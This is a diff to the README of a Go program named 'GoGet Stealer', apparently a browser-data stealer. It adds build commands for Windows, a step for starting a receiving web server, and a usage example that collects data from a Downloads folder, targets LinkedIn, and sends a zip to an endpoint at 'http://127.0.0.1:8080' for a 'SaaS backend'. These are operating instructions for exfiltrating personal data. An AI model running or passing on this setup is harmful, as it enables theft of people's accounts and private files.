@@ -12,9 +12,20 @@ Tested on Windows 10 and MacOS Venture 13.4. It should work on Linux.
 
 ![alt text](images/6.Favicon%20stealer.png)
 
-## how to build
+## How to build
 `env GOOS=windows GOARCH=amd64 go build app.go`
+or
+`GOOS=windows GOARCH=amd64 go build app.go`
 
+## Execute the web server
+go run web.go
+
+## Execute the GoGet Stealer 
+go run app.go -o output.zip 
+              -d '/Users/username/Downloads'
+              -e 'http://127.0.0.1:8080' 
+              -c linkedin
+              
 ## Command Line Arguments
 `-o is the output file flag. output.zip should be used for the SaaS backend to work correctly.`
 
